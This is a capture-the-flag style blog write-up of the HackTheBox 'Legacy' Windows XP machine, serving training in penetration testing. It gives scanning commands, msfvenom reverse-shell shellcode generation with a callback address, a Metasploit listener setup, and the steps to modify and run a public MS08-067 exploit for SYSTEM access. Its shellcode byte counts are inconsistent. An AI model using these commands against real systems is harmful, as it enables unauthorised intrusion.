---
published: true
---
Disassembly of Julio Ureña’s youtube video HackTheBox - Legacy. Windows box includes enumeration of system to an exploitable SMB server. Modifying a public exploit and inserting custom  shellcode with msfvenom both meterpreter and shell_reverse_tcp.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556775997786_image.png)

This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.


# Enumeration
Quick Masscan Script:

    #!/bin/bash
    
    #syntax ./masscan [targetip]
    echo "Starting TCP Masscan"
    masscan -p1-65535 --rate 500 -e tun0 $1 > masscan-tcp.all
    echo
    
    echo "**** Display Results ****"
    echo "****       TCP       ****"
    cat masscan-tcp.all | grep tcp | cut -d '/' -f 1 | cut -d' ' -f 4
    echo
    
    echo "Starting UDP Masscan"
    masscan -pU:1-65535 --rate 500 -e tun0 $1 > masscan-udp.all
    echo
    
    echo "**** UDP ****"
    cat masscan-udp.all | grep udp | cut -d '/' -f 1 | cut -d' ' -f 4
    echo

    nmap -sC -sV -oA nmap/legacy 10.10.10.4

(results)

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556776410300_image.png)

*we know we are dealing with a windows xp box and will next run the smb nmap script*

    nmap --script*smb-vuln* -p139,455 - nmap-smb-vuln.txt 10.10.10.4

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556777152415_image.png)

*discovered vulnerable SMB services.*

## ms08-067 exploit

based off the exploit database: https://www.exploit-db.com/exploits/40279

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556777455488_image.png)

exploit in a nutshell:

    We are taking over assembly of SHELL32.DLL and NTDLL.DLL which are vulnerable to an overflow which we then inject our own shellcode generated with msfvenom to create a connection to the target.


## creating msfvenom (meterpreter) shellcode
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.248 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode

*-v = change the variable of the output*

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556782359563_image.png)


at this point our instructions stated we need to have a file size of 380bytes and the current payload is 380 bytes.


## creating msfvenom (shell_reverse_tcp) shellcode
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.248 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556783461785_image.png)

*created with 348 bytes to which we will need to fill the rest of the space (32 bytes) with nops* `*\x90*`.

adding the nops via msfvenom:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.248 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -n 32

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556783584239_image.png)


*32 bytes of nops have been added to the final shellcode.*

## setup metasploit listener
    msfdb run #launches postgress as well
    msfconsole #normal launch

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556781278484_image.png)

    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    options

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556781346210_image.png)

    set LHOST 10.10.10.248
    set LPORT 443
    run

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556781449302_image.png)


Download exploit locally

    wget http://www.exploit-db.com/download/40279.py -O MS8-067.py

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556781743576_image.png)

edit `MS8-067.py` the shell code section:

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556781809088_image.png)


## calculate bytes of shellcode with python

open python:

    python

enter variable shellcode:

    shellcode = ""
    (paste shell code)
    len(shellcode)

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556781989166_image.png)


*without the nops we have value of 380 bytes*

## paste generated shellcode into exploit

add the shellcode generated into the exploit and remove x1 nop of `\x90` as we had 381 bytes of shellcode in our original msfvenom.

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556782495584_image.png)

quick test of length with python:

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556782613931_image.png)

*410 bytes was the exact number of bytes in the original shellcode.*

## enumerating OS type with nmap
    nmap -O 10.10.10.14

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556782843749_image.png)

*we already enumerated that the system is windows xp but to verify that before launching our exploit perform this verification. This is needed because if we send the wrong set of exploit data to the target we could crash it.*

# Exploiting

We are going to use using the option “7” for “Windows XP SP3 English (AlwaysON NX)” based off the exploit.

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556783007348_image.png)

## testing functionality

Run the script to see if we have functionality:

    python MS08-067.py

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556783090049_image.png)

*we have functionality.*

## send exploit
    python MS08-067.py 10.10.10.4 7

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556783155684_image.png)

## listener return

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556783192692_image.png)


# Root&Loot
send meterpreter `getuid`

![](https://paper-attachments.dropbox.com/s_E4E25379FC8FE4D2DE44A9BBC621E34D3023565FE6327CEC2FAD4D4849F35929_1556783276882_image.png)

*NT AUTHORITY/SYSTEM!*


----------

If you want to accomplish the task of learning Spanish and Pentesting I recommending checking out Julio at his YouTube page.
Link: https://www.youtube.com/channel/UC2o1vzpUIvgf0VMJIMKZ_rQ

